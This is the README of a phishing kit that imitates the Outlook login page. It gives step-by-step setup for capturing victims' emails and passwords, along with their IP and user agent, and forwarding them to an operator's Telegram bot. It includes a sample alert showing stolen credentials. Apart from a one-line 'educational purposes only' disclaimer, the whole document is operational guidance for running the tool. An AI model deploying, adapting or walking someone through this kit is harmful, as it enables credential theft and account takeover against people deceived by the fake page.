# Outlook Login Page with Telegram Bot Integration

A realistic Outlook login page that captures user credentials and sends them to a Telegram bot.

## Features

- 🎨 Pixel-perfect Outlook login page design
- 📱 Real-time Telegram notifications
- 🔒 Form validation and error handling
- 📊 User agent and IP tracking
- 🚀 Easy setup and deployment

## Setup Instructions

### 1. Install Dependencies

```bash
npm install
```

### 2. Create Telegram Bot

1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Follow the instructions to create your bot
4. Copy the bot token you receive

### 3. Get Your Chat ID

1. Send a message to your bot
2. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Find your chat ID in the response

### 4. Configure Environment Variables

1. Copy `env.example` to `.env`
2. Fill in your Telegram bot details:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
PORT=3000
```

### 5. Start the Server

```bash
# Development mode (with auto-restart)
npm run dev

# Production mode
npm start
```

### 6. Access the Login Page

Open your browser and go to: `http://localhost:3000`

## How It Works

1. User visits the login page
2. User enters email and password
3. Form data is sent to the backend server
4. Server captures additional info (IP, User Agent, timestamp)
5. All data is sent to your Telegram bot
6. You receive a formatted message with the credentials

## Telegram Message Format

When someone submits the form, you'll receive a message like:

```
🔐 New Login Attempt

📧 Email: user@example.com
🔑 Password: theirpassword
🌐 User Agent: Mozilla/5.0...
📍 IP Address: 192.168.1.1
⏰ Time: 12/25/2023, 3:45:30 PM
```

## File Structure

```
├── index.html          # Main login page
├── styles.css          # Outlook-style CSS
├── script.js           # Frontend JavaScript
├── server.js           # Backend server
├── package.json        # Node.js dependencies
├── env.example         # Environment variables template
└── README.md           # This file
```

## Security Notes

⚠️ **This is for educational purposes only. Always ensure you have proper authorization before using this tool.**

## Troubleshooting

### Bot not receiving messages?
- Check your bot token and chat ID
- Make sure the bot is started (send `/start` to your bot)
- Verify the `.env` file is properly configured

### Server won't start?
- Make sure port 3000 is available
- Check that all dependencies are installed
- Verify your Node.js version (requires Node.js 14+)

### Form not submitting?
- Check browser console for errors
- Ensure the server is running
- Verify the API endpoint is accessible

## License

MIT License - Use responsibly and ethically.
